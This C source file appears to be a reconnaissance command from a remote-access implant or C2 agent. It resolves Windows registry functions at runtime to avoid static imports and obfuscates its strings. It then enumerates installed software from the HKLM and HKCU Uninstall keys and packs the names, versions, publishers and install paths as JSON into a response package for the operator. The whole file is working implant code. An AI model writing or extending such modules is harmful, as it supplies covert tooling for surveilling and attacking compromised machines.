#include "config.h"
#ifdef INCLUDE_CMD_SOFTWARE

#include "commands.h"
#include "json_out.h"


typedef LONG  (WINAPI *fn_RegOpenKeyExA_t)(void*, LPCSTR, DWORD, DWORD, void**);
typedef LONG  (WINAPI *fn_RegEnumKeyExA_t)(void*, DWORD, char*, DWORD*, DWORD*, char*, DWORD*, void*, void*);
typedef LONG  (WINAPI *fn_RegQueryValueExA_t)(void*, LPCSTR, DWORD*, DWORD*, BYTE*, DWORD*);
typedef LONG  (WINAPI *fn_RegCloseKey_t)(void*);

static void reg_str(fn_RegQueryValueExA_t q, void* k, const char* name, char* out, int outsz) {
    DWORD sz = outsz - 1, type = 0;
    LONG r = q(k, name, NULL, &type, (BYTE*)out, &sz);
    if (r != 0) out[0] = 0;
}

VOID cmd_software(PINSTANCE inst, PPARSER args, PPACKAGE response) {
    xstr(_adv, "advapi32.dll");
    HMODULE h_adv = inst->Win32.LoadLibraryA(_adv);
    fn_RegOpenKeyExA_t pOpen = h_adv ? (fn_RegOpenKeyExA_t)(void*)inst->Win32.GetProcAddress(h_adv, "RegOpenKeyExA") : NULL;
    fn_RegEnumKeyExA_t pEnum = h_adv ? (fn_RegEnumKeyExA_t)(void*)inst->Win32.GetProcAddress(h_adv, "RegEnumKeyExA") : NULL;
    fn_RegQueryValueExA_t pQuery = h_adv ? (fn_RegQueryValueExA_t)(void*)inst->Win32.GetProcAddress(h_adv, "RegQueryValueExA") : NULL;
    fn_RegCloseKey_t pClose = h_adv ? (fn_RegCloseKey_t)(void*)inst->Win32.GetProcAddress(h_adv, "RegCloseKey") : NULL;
    if (!pOpen || !pEnum || !pQuery || !pClose) {
        package_add_string(inst, response, XSTR("advapi32 resolve failed"));
        response->is_error = TRUE;
        return;
    }

    // HKLM = 0x80000002, HKCU = 0x80000001
    void* roots[2] = { (void**)0x80000002, (void**)0x80000001 };
    const char* root_names[2] = {"HKLM", "HKCU"};
    const char* sub = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall";

    JSON_BUF jb;
    j_init(&jb);
    j_append_raw(&jb, "{\"software\":[");

    for (int ri = 0; ri < 2; ri++) {
        void* un_key = 0;
        if (pOpen(roots[ri], sub, 0, 0x20019, &un_key) != 0) continue;
        char key_name[256];
        DWORD key_len = 256, index = 0;
        while (pEnum(un_key, index, key_name, &key_len, NULL, NULL, NULL, NULL, NULL) == 0) {
            void* app_key = 0;
            if (pOpen(un_key, key_name, 0, 0x20019, &app_key) == 0) {
                char display[256] = {0}, ver[64] = {0}, pub[128] = {0}, loc[256] = {0};
                DWORD sz = 255;
                reg_str(pQuery, app_key, "DisplayName", display, 256);
                reg_str(pQuery, app_key, "DisplayVersion", ver, 64);
                reg_str(pQuery, app_key, "Publisher", pub, 128);
                reg_str(pQuery, app_key, "InstallLocation", loc, 256);
                pClose(app_key);
                if (display[0]) {
                    if (index || ri) j_append_raw(&jb, ",");
                    j_append_raw(&jb, "{\"name\":");
                    j_append_str(&jb, display);
                    j_append_raw(&jb, ",\"version\":");
                    j_append_str(&jb, ver);
                    j_append_raw(&jb, ",\"publisher\":");
                    j_append_str(&jb, pub);
                    j_append_raw(&jb, ",\"location\":");
                    j_append_str(&jb, loc);
                    j_append_raw(&jb, ",\"hive\":");
                    j_append_str(&jb, root_names[ri]);
                    j_append_raw(&jb, "}");
                }
            }
            key_len = 256;
            index++;
        }
        pClose(un_key);
    }
    j_append_raw(&jb, "]}");
    package_add_bytes(inst, response, (BYTE*)jb.buf, jb.len);
}

#endif
